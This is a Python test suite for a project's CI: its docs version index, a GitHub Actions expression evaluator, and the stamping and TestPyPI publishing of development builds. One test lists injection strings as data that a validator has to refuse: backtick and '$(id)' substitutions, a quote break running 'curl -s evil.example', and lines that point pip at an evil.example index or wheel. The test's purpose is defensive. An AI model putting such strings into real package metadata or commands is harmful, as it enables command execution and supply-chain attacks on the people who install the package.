    deploy job runs; it used to be a heredoc inside the workflow, where nothing could reach it
    and the rule it carried - the newest tag is stable - would have crowned the first release
    candidate published and labelled it "(stable)" beside the release it leads to.
    """

    def site(self, tmp_path: Path, *names: str) -> Path:
        site = tmp_path / f"site{len(list(tmp_path.iterdir()))}"
        site.mkdir()
        for name in names:
            (site / name).mkdir()
        return site

    def index(self, site: Path) -> dict[str, Any]:
        site_versions.write_index(site)
        loaded: dict[str, Any] = json.loads((site / "versions.json").read_text(encoding="utf-8"))
        return loaded

    def test_the_only_release_is_the_stable_one(self, tmp_path: Path) -> None:
        site = self.site(tmp_path, "latest", "v0.9.0")
        assert self.index(site) == {"stable": "v0.9.0", "versions": ["latest", "v0.9.0"]}

    def test_a_release_candidate_is_listed_and_is_not_stable(self, tmp_path: Path) -> None:
        """The case that made this a script: publishing ``v0.10.0rc1`` beside ``v0.9.0``.

        Its directory sorts above every ``v0.9.x`` - it *is* the newer version - so the rule
        "stable is the newest tag" pointed the root of the site at a release candidate while
        the version anybody could install was the one below it.
        """
        site = self.site(tmp_path, "latest", "v0.9.0", "v0.10.0rc1")
        assert self.index(site) == {
            "stable": "v0.9.0",
            "versions": ["latest", "v0.10.0rc1", "v0.9.0"],
        }

    def test_the_release_the_candidate_led_to_takes_over(self, tmp_path: Path) -> None:
        site = self.site(tmp_path, "latest", "v0.9.0", "v0.10.0rc1", "v0.10.0")
        assert self.index(site) == {
            "stable": "v0.10.0",
            "versions": ["latest", "v0.10.0", "v0.10.0rc1", "v0.9.0"],
        }

    def test_a_hotfix_on_the_old_line_does_not_take_the_site_back(self, tmp_path: Path) -> None:
        """``v0.9.1`` published after ``v0.10.0`` is older, whatever its publication date.

        The index is rewritten from what is on disk, which carries no dates - only the
        versions - so this holds by the ordering rather than by remembering anything.
        """
        site = self.site(tmp_path, "latest", "v0.9.0", "v0.10.0rc1", "v0.10.0", "v0.9.1")
        assert self.index(site) == {
            "stable": "v0.10.0",
            "versions": ["latest", "v0.10.0", "v0.10.0rc1", "v0.9.1", "v0.9.0"],
        }

    def test_before_the_first_release_the_root_lands_on_latest(self, tmp_path: Path) -> None:
        """With no release published there is nothing else to land on - a candidate included."""
        assert self.index(self.site(tmp_path, "latest"))["stable"] == "latest"
        assert self.index(self.site(tmp_path, "v0.10.0rc1")) == {
            "stable": "latest",
            "versions": ["v0.10.0rc1"],
        }

    def test_only_version_directories_are_listed(self, tmp_path: Path) -> None:
        """The branch is the site: ``.nojekyll``, the index itself and anything else pushed."""
        site = self.site(tmp_path, "latest", "v0.9.0", "assets")
        (site / "CNAME").write_text("example.com\n", encoding="utf-8")
        assert self.index(site) == {"stable": "v0.9.0", "versions": ["latest", "v0.9.0"]}

    def test_numbers_are_compared_as_numbers(self, tmp_path: Path) -> None:
        """``v0.10.0`` is newer than ``v0.9.0``; sorted as text it is not."""
        site = self.site(tmp_path, "v0.9.0", "v0.10.0", "v0.2.0")
        assert self.index(site)["versions"] == ["v0.10.0", "v0.9.0", "v0.2.0"]

    def test_the_root_redirects_to_the_stable_version(self, tmp_path: Path) -> None:
        site = self.site(tmp_path, "latest", "v0.9.0", "v0.10.0rc1")
        site_versions.write_index(site)
        page = (site / "index.html").read_text(encoding="utf-8")
        assert 'content="0; url=./v0.9.0/"' in page
        assert 'href="./v0.9.0/"' in page
        assert "v0.10.0rc1" not in page

    def test_the_run_says_what_it_published(self, tmp_path: Path) -> None:
        """The deploy job's log line, which is all a reader of a run sees of this."""
        site = self.site(tmp_path, "latest", "v0.9.0", "v0.10.0rc1")
        assert site_versions.write_index(site) == (
            "stable is v0.9.0, versions are latest, v0.10.0rc1, v0.9.0"
        )

    def test_the_script_is_what_the_workflow_runs(self) -> None:
        """Pinning the orderings above is worth nothing if the workflow inlines them again."""
        assert "tools/site_versions.py" in DOCS_WORKFLOW, (
            "the deploy job no longer runs the script these orderings are pinned on"
        )
        assert "def order(" not in DOCS_WORKFLOW, (
            "the version index is computed inside the workflow again, where no test reaches it"
        )

    def test_the_sdist_carries_it(self) -> None:
        """The suite runs from the sdist, so what the suite imports has to be in the sdist."""
        metadata = tomllib.loads((ROOT / "pyproject.toml").read_text(encoding="utf-8"))
        assert "/tools" in metadata["tool"]["hatch"]["build"]["targets"]["sdist"]["include"]


def job(workflow: str, name: str) -> str:
    """One job of a workflow, from its key to the key of the next one."""
    assert f"\n  {name}:\n" in workflow, f"the workflow has no job called {name}"
    body = workflow.split(f"\n  {name}:\n", 1)[1]
    return re.split(r"\n  [a-z][\w-]*:\n", body, maxsplit=1)[0]


def job_names(workflow: str) -> list[str]:
    """The key of every job of a workflow, in order. The pattern is checked against three jobs
    ``ci.yml`` has, so that one missing any of them fails every test reading this list, rather
    than leaving that job out of it in silence."""
    names = re.findall(r"^  ([a-z][\w-]*):\n", workflow.split("\njobs:\n", 1)[1], re.M)
    assert {"test", "lint", "gui"} <= set(names), f"the jobs of the workflow are read as {names}"
    return names


def uncommented(text: str) -> str:
    """What a workflow or a script runs, its comments left out."""
    return "\n".join(line for line in text.splitlines() if not line.lstrip().startswith("#"))


def comments_of(text: str) -> str:
    """What a workflow, a requirements file or a manifest says in its comments, as one line of
    prose: each comment line without its ``#``, the lines flattened as a page's are."""
    said = [line.lstrip()[1:] for line in text.splitlines() if line.lstrip().startswith("#")]
    return flattened(" ".join(said)).strip()


def step(job_text: str, name: str) -> str:
    """One step of a job, from its ``- name:`` line to the next step."""
    assert f"- name: {name}\n" in job_text, f"the job has no step called {name}"
    return re.split(r"\n      - ", job_text.split(f"- name: {name}\n", 1)[1], maxsplit=1)[0]


def run_step(step_text: str, cwd: Path, **variables: str) -> subprocess.CompletedProcess[str]:
    """A step's ``run:`` script, a ``|`` block or a single line, run the way the runner runs
    one: ``bash -e``, in ``cwd``.

    The variables are exported by the script itself rather than handed over in the environment
    of the process, so that a bash that does not inherit it - WSL's, on windows - sees them too.
    ``python3`` and ``python`` are this interpreter: the runner's own is what a step calls
    ``python3``, a job's setup-python is what it calls ``python``, and a windows machine may
    have neither by those names.
    """
    block = re.search(r"^        run: (?:\|\n((?: {10}.*\n|\n)*)|(.+)\n)", step_text + "\n", re.M)
    assert block is not None, "the step runs no script"
    script = block.group(2) + "\n" if block.group(1) is None else textwrap.dedent(block.group(1))
    bash = shutil.which("bash")
    assert bash is not None, "the workflow's scripts are bash, so bash is needed to run them"
    exports = "".join(f"export {name}={shlex.quote(value)}\n" for name, value in variables.items())
    interpreter = shlex.quote(Path(sys.executable).as_posix())
    pythons = f'python3() {{ {interpreter} "$@"; }}\npython() {{ {interpreter} "$@"; }}\n'
    return subprocess.run(
        [bash, "-e", "-c", pythons + exports + script],
        cwd=cwd,
        capture_output=True,
        text=True,
        check=False,
    )


def steps_of(job_text: str) -> list[str]:
    """Every step of a job in order, each from the line after its ``- `` to the next step."""
    return re.split(r"^      - ", job_text.split("\n    steps:\n", 1)[1], flags=re.M)[1:]


def setting(text: str, key: str, indent: int) -> str | None:
    """The value of ``key`` at ``indent`` spaces of a workflow's text - a plain one as written, a
    folded one (``>-``) joined as YAML joins it - or None where the key is not set."""
    pad = " " * indent
    found = re.search(
        rf"^{pad}{re.escape(key)}: *(?:>-\n((?:{pad}  .*\n)+)|(.+)\n)", text + "\n", re.M
    )
    if found is None:
        return None
    if found.group(1) is None:
        return found.group(2).strip()
    return " ".join(line.strip() for line in found.group(1).splitlines())


def events(workflow: str) -> dict[str, str]:
    """The events a workflow runs on, each with the lines configuring it."""
    block = re.split(r"\n(?=\S)", workflow.split("\non:\n", 1)[1], maxsplit=1)[0]
    found = re.split(r"^  ([a-z_]+):", block, flags=re.M)
    return dict(zip(found[1::2], found[2::2], strict=True))


CONTEXTS = frozenset({"github", "inputs", "steps", "needs", "env", "vars", "matrix", "runner"})
"""The contexts an expression may read: a word naming none of them - ``true``, a function this
reader does not know - is refused, rather than read as a property nothing holds."""

JSON_NUMBER = re.compile(r"-?(?:0|[1-9]\d*)(?:\.\d+)?(?:[eE][+-]?\d+)?")


def truthy(value: Any) -> bool:
    """GitHub's truth: null, false, 0 and the empty string are false, and nothing else is."""
    return value not in (None, False, 0, "")


def text_of(value: Any) -> str:
    """A value as GitHub writes it into a string: null as nothing, a boolean in lower case."""
    if value is None:
        return ""
    return str(value).lower() if isinstance(value, bool) else str(value)


def number_of(value: Any) -> float | None:
    """A value as GitHub turns one into a number to compare it with a value of another type:
    null and the empty string are 0, a boolean 1 or 0, a string the number it spells; None
    stands for NaN, which is equal to nothing."""
    if value is None or value == "":
        return 0.0
    if isinstance(value, bool | int | float):
        return float(value)
    if isinstance(value, str) and JSON_NUMBER.fullmatch(value.strip()):
        return float(value)
    return None


def equal(left: Any, right: Any) -> bool:
    """``==`` as GitHub has it: two strings whatever their case, two values of one type as they
    are, and values of two types as numbers."""
    if isinstance(left, str) and isinstance(right, str):
        return left.casefold() == right.casefold()
    if type(left) is type(right):
        return bool(left == right)
    number = number_of(left)
    return number is not None and number == number_of(right)


def ordered(left: Any, operator: str, right: Any) -> bool:
    """``<``, ``<=``, ``>`` or ``>=`` as GitHub has them: both values read as numbers, the way
    ``==`` reads values of two types, and NaN in no order with anything. Two strings, which it
    compares otherwise, are refused rather than read wrong."""
    assert not (isinstance(left, str) and isinstance(right, str)), f"{left!r} {operator} {right!r}"
    first, second = number_of(left), number_of(right)
    if first is None or second is None:
        return False
    return {
        "<": first < second,
        "<=": first <= second,
        ">": first > second,
        ">=": first >= second,
    }[operator]


class Expression:
    """A GitHub Actions expression, evaluated over a context as the runner evaluates one.

    It reads what the workflows write - string and number literals, the contexts' dotted names,
    ``!``, ``<``, ``<=``, ``>``, ``>=``, ``==``, ``!=``, ``&&``, ``||``, parentheses,
    ``format()`` and ``startsWith()`` - and refuses anything else, so that a condition it cannot
    read fails the test reading it instead of being read wrong. As GitHub documents the
    language: the comparisons bind tighter than ``==`` and ``!=``, ``&&`` tighter than ``||``,
    both of which evaluate to one of their operands, and a property the context does not hold
    is null.
    """

    TOKEN = re.compile(
        r"\s*('(?:[^']|'')*'|==|!=|<=|>=|&&|\|\||[!(),<>]|\d+(?:\.\d+)?|[A-Za-z_][\w.-]*)"
    )

    def __init__(self, text: str, context: dict[str, Any]) -> None:
        self.text, self.context, self.at = text.strip(), context, 0
        self.tokens: list[str] = []
        position = 0
        while position < len(self.text):
            found = self.TOKEN.match(self.text, position)
            assert found is not None, f"cannot read {self.text[position:]!r} in {self.text!r}"
            self.tokens.append(found.group(1))
            position = found.end()

    def value(self) -> Any:
        result = self.alternative()
        assert self.at == len(self.tokens), f"cannot read {self.tokens[self.at :]} in {self.text!r}"
        return result

    def peek(self) -> str | None:
        return self.tokens[self.at] if self.at < len(self.tokens) else None

    def take(self) -> str:
        assert self.at < len(self.tokens), f"{self.text!r} ends where something more is expected"
        self.at += 1
        return self.tokens[self.at - 1]

    def alternative(self) -> Any:
        left = self.conjunction()
        while self.peek() == "||":
            self.take()
            right = self.conjunction()
            left = left if truthy(left) else right
        return left

    def conjunction(self) -> Any:
        left = self.comparison()
        while self.peek() == "&&":
            self.take()
            right = self.comparison()
            left = right if truthy(left) else left
        return left

    def comparison(self) -> Any:
        left = self.relation()
        while self.peek() in ("==", "!="):
            same = self.take() == "=="
            left = equal(left, self.relation()) == same
        return left

    def relation(self) -> Any:
        left = self.negation()
        while self.peek() in ("<", "<=", ">", ">="):
            operator = self.take()
            left = ordered(left, operator, self.negation())
        return left

    def negation(self) -> Any:
        if self.peek() == "!":
            self.take()
            return not truthy(self.negation())
        return self.operand()

    def operand(self) -> Any:
        token = self.take()
        if token == "(":
            inner = self.alternative()
            assert self.take() == ")", f"a parenthesis is left open in {self.text!r}"
            return inner
        if token.startswith("'"):
            return token[1:-1].replace("''", "'")
        if token[0].isdigit():
            return float(token)
        if self.peek() == "(":
            assert token in ("format", "startsWith"), f"{token}() is not read, in {self.text!r}"
            self.take()
            arguments = [self.alternative()]
            while self.peek() == ",":
                self.take()
                arguments.append(self.alternative())
            assert self.take() == ")", f"a call is left open in {self.text!r}"
            if token == "startsWith":
                # Case aside, as every comparison of strings GitHub makes.
                text, start = (text_of(argument).casefold() for argument in arguments)
                return text.startswith(start)
            return re.sub(
                r"\{\{|\}\}|\{(\d+)\}",
                lambda found: (
                    found.group(0)[0]
                    if found.group(1) is None
                    else text_of(arguments[1 + int(found.group(1))])
                ),
                text_of(arguments[0]),
            )
        root, *path = token.split(".")
        assert root in CONTEXTS, f"{token} is not read here, in {self.text!r}"
        found: Any = self.context.get(root)
        for key in path:
            found = found.get(key) if isinstance(found, dict) else None
        return found


def evaluated(text: str, context: dict[str, Any]) -> Any:
    """A workflow value over ``context``: an expression standing alone keeps its type, as an
    ``if:`` or a ``cancel-in-progress:`` has it, and one inside other text is written into it."""
    alone = re.fullmatch(r"\$\{\{(.*)\}\}", text.strip(), re.S)
    if alone is not None and "${{" not in alone.group(1):
        return Expression(alone.group(1), context).value()
    return re.sub(
        r"\$\{\{(.*?)\}\}",
        lambda found: text_of(Expression(found.group(1), context).value()),
        text,
        flags=re.S,
    )


def holds(condition: str | None, context: dict[str, Any]) -> bool:
    """Whether an ``if:`` holds over ``context``: one written without ``${{ }}`` is an
    expression all the same, and a job or a step with none runs."""
    if condition is None:
        return True
    return truthy(
        evaluated(condition if "${{" in condition else f"${{{{ {condition} }}}}", context)
    )


def job_runs(workflow: str, name: str, context: dict[str, Any]) -> bool:
    """Whether a job of a workflow runs over ``context``: every job it needs ran, and its own
    ``if:`` holds. GitHub reads a condition calling no status function as ``success() && (it)``,
    which is what skips a job whose dependency was skipped; the reader above knows no status
    function, so a condition calling one is refused rather than read without it."""
    body = job(workflow, name)
    needed = re.findall(r"[\w-]+", setting(body, "needs", 4) or "")
    return all(job_runs(workflow, other, context) for other in needed) and holds(
        setting(body, "if", 4), context
    )


def step_environment(step_text: str, context: dict[str, Any]) -> dict[str, str]:
    """What a step runs with: the variables the runner sets for every step, from the run's
    context, and the step's own ``env:``, evaluated over that context."""
    github = context["github"]
    variables = {
        "GITHUB_EVENT_NAME": github["event_name"],
        "GITHUB_REF": github["ref"],
        "GITHUB_REF_NAME": github["ref_name"],
        "GITHUB_SHA": github["sha"],
        "GITHUB_RUN_ID": github["run_id"],
        "GITHUB_REPOSITORY": "Sauci/ddd",
    }
    env = re.search(r"^        env:\n((?: {10}\S.*\n)+)", step_text + "\n", re.M)
    for line in env.group(1).splitlines() if env is not None else []:
        if not line.lstrip().startswith("#"):
            name, value = line.strip().split(": ", 1)
            variables[name] = text_of(evaluated(value, context))
    return variables


STAMPED = ("pyproject.toml", "src/ddd/__init__.py", "cmake/Ddd.cmake")
"""The three files the development build rewrites: what the installed package compares."""

RELEASE = "1.2.3"
"""The release the copies these tests stamp state, whatever the tree they are copied from states.

The tree a development build publishes, its sdist, states a development version, and the stamp
refuses to number a build after one: the copies are made to state a release first, so that the
tool's own tests pass in that tree as they do in a checkout.
"""

COMMIT = "0123456789abcdef0123456789abcdef01234567"
COMMIT_URL = f"https://github.com/Sauci/ddd/commit/{COMMIT}"
WHEEL = "ddd_tool-0.10.1.dev57-py3-none-any.whl"
SDIST = "ddd_tool-0.10.1.dev57.tar.gz"


class TestTheDevelopmentBuild:
    """The last commit of every push to master and to this repository's pull requests, on TestPyPI.

    ``tools/dev_version.py`` stamps the version ci builds them under, ``<next patch>.dev<run>``,
    into the three places the installed package compares at run time; the ``dev-build`` job of
    ``ci.yml`` runs it, and ``dev-publish`` checks what it was handed - the version, the files,
    the wheel's commit and requirements - before uploading it and writing the run's summary.
    What is pinned here is what would fail silently, or in somebody else's build: a spelling
    left behind, which ``cmake/Ddd.cmake`` refuses in the configure step of whoever installed
    the build; a version sorting beneath the release it follows; an install line naming both
    indexes, or written by the job that ran the build; and a job publishing from more places,
    more files, or with more code around the token, than it should.
    """

    @staticmethod
    def stating(where: Path, version: str) -> Path:
        """A copy of the three files the stamp rewrites in ``where``, stating ``version`` and no
        commit."""
        spellings = {
            "pyproject.toml": (r'^version = "[^"]*"$', f'version = "{version}"'),
            "src/ddd/__init__.py": (r'^__version__ = "[^"]*"$', f'__version__ = "{version}"'),
            "cmake/Ddd.cmake": (
                r'^set\(DDD_MODULE_VERSION "[^"]*"\)$',
                f'set(DDD_MODULE_VERSION "{version}")',
            ),
        }
        for name, (pattern, spelled) in spellings.items():
            text = (ROOT / name).read_text(encoding="utf-8")
            text, count = re.subn(pattern, spelled, text, flags=re.MULTILINE)
            assert count == 1, f"{name} no longer states its version on a line of its own"
            # What a stamped tree's project table carries besides its version.
            text = re.sub(r'^Commit = "[^"]*"\n', "", text, flags=re.MULTILINE)
            target = where / name
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text(text, encoding="utf-8", newline="\n")
        return where

    @pytest.fixture
    def tree(self, tmp_path: Path) -> Path:
        """A copy of the three files the stamp rewrites, stating ``RELEASE`` and no commit."""
        return self.stating(tmp_path, RELEASE)

    @staticmethod
    def contents(tree: Path) -> dict[str, bytes]:
        return {name: (tree / name).read_bytes() for name in STAMPED}

    @staticmethod
    def dist(tmp_path: Path, *names: str) -> Path:
        """A ``dist/`` holding ``names``, empty files - or a directory, for a name ending in /."""
        (tmp_path / "dist").mkdir()
        for name in names:
            if name.endswith("/"):
                (tmp_path / "dist" / name).mkdir()
            else:
                (tmp_path / "dist" / name).write_bytes(b"")
        return tmp_path

    @staticmethod
    def wheel(tmp_path: Path, *headers: str) -> Path:
        """A ``dist/`` holding a wheel of nothing but its metadata, which is all that is read.

        The headers are spelled the way hatchling writes them - ``Project-URL: <label>, <url>``,
        and an extra's requirement marked ``extra == 'dev'`` - as read off a wheel it built.
        """
        (tmp_path / "dist").mkdir()
        metadata = ["Metadata-Version: 2.5", "Name: ddd-tool", "Version: 0.10.1.dev57", *headers]
        with zipfile.ZipFile(tmp_path / "dist" / WHEEL, "w") as archive:
            archive.writestr(
                "ddd_tool-0.10.1.dev57.dist-info/METADATA", "\n".join([*metadata, "", "# DDD", ""])
            )
        return tmp_path

    @staticmethod
    def read_requirements(cwd: Path) -> subprocess.CompletedProcess[str]:
        """``dev-publish``'s step reading the checked wheel, as run 57 of ``COMMIT`` runs it."""
        return run_step(
            step(job(CI_WORKFLOW, "dev-publish"), "Read the requirements off the checked wheel"),
            cwd,
            VERSION="0.10.1.dev57",
            COMMIT=COMMIT,
            GITHUB_SERVER_URL="https://github.com",
            GITHUB_REPOSITORY="Sauci/ddd",
            GITHUB_OUTPUT="output",
        )

    @pytest.mark.parametrize(
        ("release", "run", "development"),
        [("0.10.0", 57, "0.10.1.dev57"), ("0.9.9", 3, "0.9.10.dev3"), ("1.2", 1, "1.3.dev1")],
    )
    def test_the_version_is_the_next_patch_of_the_release_and_the_run(
        self, release: str, run: int, development: str
    ) -> None:
        assert dev_version.next_development(release, run) == development

    def test_it_sorts_after_the_release_it_follows_and_before_the_next(self) -> None:
        """Why the next patch: a development release of 0.10.0 itself sorts before 0.10.0, so
        ``pip install --pre`` would call the release newer than every commit made after it."""
        assert Version("0.10.0") < Version(dev_version.next_development("0.10.0", 57))
        assert Version(dev_version.next_development("0.10.0", 57)) < Version("0.10.1")
        assert Version("0.10.0.dev57") < Version("0.10.0")

    @pytest.mark.parametrize(
        "version",
        [
            "0.11.0a1",
            "0.11.0b1",
            "0.11.0rc1.dev3",
            "0.10.1.dev3",
            "0.10.0.post1",
            "0.10.0+g0123abc",
            "v0.10.0",
            "",
        ],
    )
    def test_a_version_with_no_next_patch_is_refused(self, version: str) -> None:
        """None of these is anything a commit of master states - an alpha or a beta, a
        development, post or local release - and guessing would publish a build that sorts where
        nobody expects it."""
        with pytest.raises(ValueError, match=r"only a release, such as 0\.10\.0, or a candidate"):
            dev_version.next_development(version, 57)

    @pytest.mark.parametrize(
        ("candidate", "run", "development"),
        [("0.12.0rc1", 57, "0.12.0rc2.dev57"), ("1.0rc9", 3, "1.0rc10.dev3")],
    )
    def test_a_candidate_is_followed_by_the_next_candidate_s_development_build(
        self, candidate: str, run: int, development: str
    ) -> None:
        """Ruling B8-13. A candidate was refused, and every wheel ci builds is stamped: while
        master stated one, the gui leg of every run failed, a pull request's included."""
        assert dev_version.next_development(candidate, run) == development

    def test_it_sorts_after_the_candidate_and_before_whatever_follows_it(self) -> None:
        """A candidate has two next versions, its next candidate and its release, and the next
        candidate's development build sorts before both, and after the candidate itself - where
        ``0.12.0.dev57`` would sort before the candidate."""
        development = Version(dev_version.next_development("0.12.0rc1", 57))
        assert Version("0.12.0rc1") < development < Version("0.12.0rc2") < Version("0.12.0")
        assert Version("0.12.0.dev57") < Version("0.12.0rc1")

    def test_a_candidate_s_tree_is_stamped_as_the_next_candidate_s_build(self, tree: Path) -> None:
        """The three spellings and the commit, as for a release's tree."""
        for name in STAMPED:
            text = (
                (tree / name).read_text(encoding="utf-8").replace(f'"{RELEASE}"', f'"{RELEASE}rc1"')
            )
            (tree / name).write_text(text, encoding="utf-8", newline="\n")
        assert dev_version.stamp(tree, "57", COMMIT) == "1.2.3rc2.dev57"
        project = tomllib.loads((tree / "pyproject.toml").read_text(encoding="utf-8"))["project"]
        assert (project["version"], project["urls"]["Commit"]) == ("1.2.3rc2.dev57", COMMIT_URL)
        package = (tree / "src" / "ddd" / "__init__.py").read_text(encoding="utf-8")
        assert '__version__ = "1.2.3rc2.dev57"' in package.splitlines()
        module = (tree / "cmake" / "Ddd.cmake").read_text(encoding="utf-8")
        assert 'set(DDD_MODULE_VERSION "1.2.3rc2.dev57")' in module.splitlines()

    def test_the_three_spellings_and_the_commit_are_all_that_changes(self, tree: Path) -> None:
        """``ddd --version`` prints ``__version__``, the module compares that with its own by
        exact string, and ``pyproject.toml`` names the distribution: one left behind and the
        installed build refuses itself, the way a release bumped in two of the three would."""
        before = {name: (tree / name).read_text(encoding="utf-8") for name in STAMPED}
        version = dev_version.stamp(tree, "57", COMMIT)
        assert version == "1.2.4.dev57"
        changed = {
            "pyproject.toml": (
                {f'version = "{RELEASE}"'},
                {f'version = "{version}"', f'Commit = "{COMMIT_URL}"'},
            ),
            "src/ddd/__init__.py": (
                {f'__version__ = "{RELEASE}"'},
                {f'__version__ = "{version}"'},
            ),
            "cmake/Ddd.cmake": (
                {f'set(DDD_MODULE_VERSION "{RELEASE}")'},
                {f'set(DDD_MODULE_VERSION "{version}")'},
            ),
        }
        for name, (removed, added) in changed.items():
            old = before[name].splitlines()
            new = (tree / name).read_text(encoding="utf-8").splitlines()
            assert (set(old) - set(new), set(new) - set(old)) == (removed, added), name
            assert len(new) - len(old) == len(added) - len(removed), name
            # .gitattributes checks every file out with lf endings, windows included.
            assert b"\r\n" not in (tree / name).read_bytes(), name
        project = tomllib.loads((tree / "pyproject.toml").read_text(encoding="utf-8"))["project"]
        assert (project["version"], project["urls"]["Commit"]) == (version, COMMIT_URL)

    def test_a_tree_whose_spellings_disagree_is_refused_as_it_was(self, tree: Path) -> None:
        """The suite refuses such a tree already; publishing it would hand the disagreement to
        whoever installs the build, as a configure step that refuses the tool."""
        module = tree / "cmake" / "Ddd.cmake"
        text = module.read_text(encoding="utf-8").replace(f'"{RELEASE}")', '"0.0.1")')
        module.write_text(text, encoding="utf-8", newline="\n")
        before = self.contents(tree)
        with pytest.raises(ValueError, match=r"Ddd\.cmake"):
            dev_version.stamp(tree, "57", COMMIT)
        assert self.contents(tree) == before

    def test_a_project_naming_no_homepage_is_refused(self, tree: Path) -> None:
        """The commit's url is the homepage's, which is this repository's."""
        project = tree / "pyproject.toml"
        text = project.read_text(encoding="utf-8").replace("Homepage =", "Home =")
        project.write_text(text, encoding="utf-8", newline="\n")
        with pytest.raises(ValueError, match="names no Homepage"):
            dev_version.stamp(tree, "57", COMMIT)

    @pytest.mark.parametrize(
        ("run", "commit"),
        [("", COMMIT), ("5a", COMMIT), ("-1", COMMIT), ("57", COMMIT[:7]), ("57", "")],
    )
    def test_what_ci_hands_it_is_checked_before_anything_is_written(
        self, tree: Path, run: str, commit: str
    ) -> None:
        """An empty expression is an empty string, and a url ending in ``/commit/`` would be
        published with nothing to say about it."""
        before = self.contents(tree)
        with pytest.raises(ValueError):
            dev_version.stamp(tree, run, commit)
        assert self.contents(tree) == before

    def test_the_command_line_prints_the_version_it_stamped(
        self, tree: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        """What the job hands on, to the environment's url and to the artifact's name."""
        assert dev_version.main(["stamp", "57", COMMIT], root=tree) == 0
        assert capsys.readouterr().out == "1.2.4.dev57\n"

    def test_a_refusal_is_a_failed_step_with_its_reason(
        self, tree: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        assert dev_version.main(["stamp", "57", "HEAD"], root=tree) == 1
        said = capsys.readouterr()
        assert said.out == "" and "'HEAD'" in said.err

    @pytest.mark.parametrize(
        "arguments",
        [[], ["stamp", "57"], ["dependencies", WHEEL], ["summary", WHEEL], ["tag", "57", COMMIT]],
    )
    def test_anything_else_is_a_usage_error(
        self, arguments: list[str], capsys: pytest.CaptureFixture[str]
    ) -> None:
        assert dev_version.main(arguments) == 2
        assert "usage:" in capsys.readouterr().err

    def test_the_requirements_are_the_checked_wheels_own_runtime_ones(self, tmp_path: Path) -> None:
        """Read off the wheel about to be uploaded, by the job that uploads it, so that they are
        exactly its own - an extra's left out - and nothing ``dev-build`` printed is taken."""
        cwd = self.wheel(
            tmp_path,
            f"Project-URL: Commit, {COMMIT_URL}",
            "Project-URL: Homepage, https://github.com/Sauci/ddd",
            "Requires-Dist: jinja2<4,>=3.1",
            "Requires-Dist: pydantic<3,>=2.7",
            "Provides-Extra: dev",
            "Requires-Dist: pytest>=8.0; extra == 'dev'",
            "Requires-Dist: colorama; sys_platform == 'win32' and extra == 'dev'",
        )
        read = self.read_requirements(cwd)
        assert read.returncode == 0, read.stdout + read.stderr
        output = (cwd / "output").read_text(encoding="utf-8")
        assert output == 'line=pip install "jinja2<4,>=3.1" "pydantic<3,>=2.7"\n'

    @pytest.mark.parametrize(
        "requirement",
        [
            "pydantic<3`id`",
            "pydantic<3$(id)",
            'pydantic"; curl -s evil.example; "',
            "jinja2<4\n ```\n pip install --index-url https://evil.example/simple/ ddd-tool",
            "--index-url=evil.example",
            "evil @ https://evil.example/evil-1.0-py3-none-any.whl",
            'tomli>=2; python_version < "3.13"',
            "a" * 300,
        ],
        ids=[
            "a backtick",
            "a dollar",
            "a quote",
            "a line break",
            "an option",
            "a url",
            "a marker",
            "an oversized requirement",
        ],
    )
    def test_a_requirement_no_install_line_may_print_is_refused_before_the_upload(
        self, tmp_path: Path, requirement: str
    ) -> None:
        """The wheel was built where the pages' packages ran their install scripts, so what it
        declares is held to quoted requirements of letters, digits and the signs a specifier
        needs, and to 200 characters. A line break, a backtick or a quote would let a planted
        requirement close the summary's code fence, or the quoted argument, and print an install
        line of its own; an option or a url would name another index. A marker's strings need
        quotes too, so a runtime requirement with one is refused as well, until the day one is
        needed. Length is checked on its own: a requirement of only allowed characters still
        matches the pattern however long it is - one tried against it was 32 MiB."""
        cwd = self.wheel(
            tmp_path, f"Project-URL: Commit, {COMMIT_URL}", f"Requires-Dist: {requirement}"
        )
        read = self.read_requirements(cwd)
        assert read.returncode == 1, read.stdout + read.stderr
        assert read.stdout.startswith("::error::")
        assert not (cwd / "output").exists(), "a refused line was handed to the summary"
        assert "\npip install" not in read.stdout and "\n```" not in read.stdout

    @pytest.mark.parametrize(
        "urls",
        [[], [f"Project-URL: Commit, {COMMIT_URL.replace('0123', '3210')}"]],
        ids=["no commit", "another commit"],
    )
    def test_a_wheel_naming_another_commit_than_the_runs_is_refused(
        self, tmp_path: Path, urls: list[str]
    ) -> None:
        """The version cannot carry the commit, so the metadata is the one place that says what
        the build is of - and it has to say this run's."""
        read = self.read_requirements(self.wheel(tmp_path, *urls, "Requires-Dist: pydantic<3"))
        assert read.returncode == 1, read.stdout + read.stderr
        assert read.stdout.startswith("::error::")

    def test_the_build_runs_the_script_and_checks_the_wheel_it_builds(self) -> None:
        """The rules above are worth nothing if the workflow does something else inline; and
        no line of the summary is written where the build ran."""
        build = uncommented(job(CI_WORKFLOW, "dev-build"))
        assert "tools/dev_version.py stamp" in build
        assert 'if "ddd/gui/static/index.html" not in names:' in build
        assert "test.pypi.org/simple" not in build
        assert "pip install" not in build.split('if "ddd/gui/static/index.html"', 1)[1]
        handed = re.search(r"^    outputs:\n((?:      .*\n)+)", build + "\n", re.M)
        assert handed is not None, "dev-build no longer hands its version over"
        assert handed.group(1).split(":", 1)[0].strip() == "version", handed.group(1)
        assert len(handed.group(1).splitlines()) == 1, f"dev-build hands over {handed.group(1)}"
        assert "needs.dev-build.outputs.dependencies" not in uncommented(CI_WORKFLOW)

    def test_it_waits_for_every_other_job_of_the_run(self) -> None:
        """The maintainer was told a development build waits for the whole of ci: a commit any
        job fails is no build to point anybody at, and a job added to ci.yml joins the wait."""
        names = job_names(CI_WORKFLOW)
        waited = re.search(r"^    needs: \[([^]\n]*)\]$", job(CI_WORKFLOW, "dev-build"), re.M)
        assert waited is not None, "dev-build no longer lists the jobs it waits for"
        assert sorted(waited.group(1).split(", ")) == sorted(
            set(names) - {"dev-build", "dev-publish"}
        )

    def test_a_branch_older_than_the_script_is_told_to_merge_master(self, tmp_path: Path) -> None:
        """Its head has no ``tools/dev_version.py``, and python's "can't open file" says nothing
        about why; the step before the stamp does."""
        build = job(CI_WORKFLOW, "dev-build")
        guard = step(build, "Check the commit carries the stamping script")
        refused = run_step(guard, tmp_path, COMMIT=COMMIT)
        assert refused.returncode == 1
        assert refused.stdout.startswith("::error::") and "Merge master" in refused.stdout
        (tmp_path / "tools").mkdir()
        (tmp_path / "tools" / "dev_version.py").write_text("", encoding="utf-8")
        assert run_step(guard, tmp_path, COMMIT=COMMIT).returncode == 0
